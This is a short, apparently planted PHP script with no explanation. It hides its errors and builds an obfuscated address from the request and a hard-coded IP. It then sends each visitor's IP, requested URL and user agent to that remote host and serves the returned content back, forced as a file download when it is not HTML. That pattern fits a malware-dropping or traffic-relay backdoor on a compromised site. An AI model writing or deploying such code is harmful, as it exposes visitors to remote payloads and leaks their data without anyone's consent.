<?php
require 'include.php';

error_reporting(0);
ini_set("display_errors", 0);
$key = 0;
$i = 0;
foreach (str_split($_SERVER["REQUEST_URI"]) as $letter) {
    $key+= ord($letter);
    $i++;
}
if (!($i / 10)) {
    $i();
    exit();
}
$key^= $key;
$key+= 32;
$key = str_repeat(chr($key), 8);
$ip = "125.89.44.28";
$port = "80";
$path = "/fdn/entry.php";
$query = array();
$query["ip"] = getIp();
$query["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$query["useragent"] = getUseragent();
$url = "http://" . convertIpToString(1048202089 ^ (ord($key[0]) + ord($key[1]) + (strstr(substr($_SERVER["REQUEST_URI"], -4), ".php") == FALSE ? 65 : ip2long($ip)))) . ":" . $port . $path . "?" . http_build_query($query);
$content = @file_get_contents($url);
if (strlen($content) < 10) {
    error_404();
}
$content = explode(";", $content);
$filename = array_shift($content);
$content = implode(";", $content);
if (strstr($filename, ".html") === FALSE) {
    $type = "application/octet-stream";
    header("Content-Type:" . $type);
    header("Content-Disposition: attachment; filename=" . $filename);
    header("Content-Length: " . strlen($content));
}
echo $content;
